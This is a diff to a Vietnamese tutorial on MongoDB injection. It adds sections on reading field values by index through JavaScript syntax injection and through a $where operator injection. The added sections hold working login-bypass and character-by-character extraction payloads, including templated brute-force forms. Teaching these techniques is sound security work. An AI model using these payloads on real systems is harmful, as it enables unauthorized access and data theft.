@@ -291,7 +291,37 @@ admin' && this["FIELD_NAME"].match(/^a/) || 'a'=='b
 
 Điểm cần phân biệt: `Object.keys(this)[n].match(...)` trong phần này là JavaScript expression được chèn qua syntax injection. Nó khác với operator injection dạng JSON như `{"$regex":"^a"}`.
 
-### 3.9. Timing-based syntax injection
+### 3.9. Extract dữ liệu field theo index
+
+Nếu đã biết vị trí field trong `Object.keys(this)` nhưng chưa biết tên field, vẫn có thể đọc giá trị bằng bracket notation (truy cập thuộc tính bằng biểu thức trong `[]`). Kỹ thuật này hữu ích khi chỉ cần extract value của field ở một index cụ thể, không cần khôi phục field name trước.
+
+Ví dụ xác định độ dài value của field ở index `2`:
+
+```text
+administrator' && this[Object.keys(this)[2]].length > 1 && '1'=='1
+```
+
+Trong đó `Object.keys(this)[2]` trả về tên field ở index `2`, rồi `this[...]` đọc value của field đó.
+
+Sau khi biết độ dài hoặc khoảng độ dài, có thể kiểm tra từng ký tự bằng `match()`:
+
+```text
+administrator' && this[Object.keys(this)[2]].match(/^.{0}p/) && '1'=='1
+```
+
+Payload trên kiểm tra ký tự ở vị trí `0` của value có phải `p` hay không. Payload tổng quát:
+
+```text
+administrator' && this[Object.keys(this)[§fieldIndex§]].match(/^.{§position§}§char§/) && '1'=='1
+```
+
+Trong đó:
+
+- `fieldIndex`: vị trí field trong `Object.keys(this)`.
+- `position`: vị trí ký tự trong value.
+- `char`: ký tự đang thử.
+
+### 3.10. Timing-based syntax injection
 
 Đôi khi database error không tạo khác biệt rõ ràng trong response body. Khi đó có thể phát hiện và khai thác bằng JavaScript injection gây conditional time delay (độ trễ có điều kiện).
 
@@ -504,7 +534,31 @@ Ví dụ:
 
 Payload này kiểm tra field đầu tiên của object hiện tại và so khớp ký tự đầu tiên của field name. Bằng cách thay đổi index field, vị trí ký tự, và ký tự thử, có thể extract field name từng ký tự.
 
-### 4.7. Extract data bằng `$regex`
+### 4.7. Extract dữ liệu field theo index
+
+Với operator injection, nếu có thể chèn top-level `$where`, có thể dùng `this[Object.keys(this)[n]]` để đọc value của field ở một index cụ thể mà không cần biết tên field.
+
+Ví dụ xác định độ dài value của field ở index `2`:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[2]].length > 1"}
+```
+
+Sau đó kiểm tra từng ký tự bằng `match()`:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[2]].match(/^.{0}p/)"}
+```
+
+Payload tổng quát:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[FIELD_INDEX]].match(/^.{POSITION}CHAR/)"}
+```
+
+Khác với syntax injection, payload ở đây không cần đóng chuỗi input ban đầu. `$where` được thêm như một operator mới trong JSON query.
+
+### 4.8. Extract data bằng `$regex`
 
 Trong một số trường hợp, vẫn có thể extract data bằng operator không chạy JavaScript. Ví dụ login request:
 
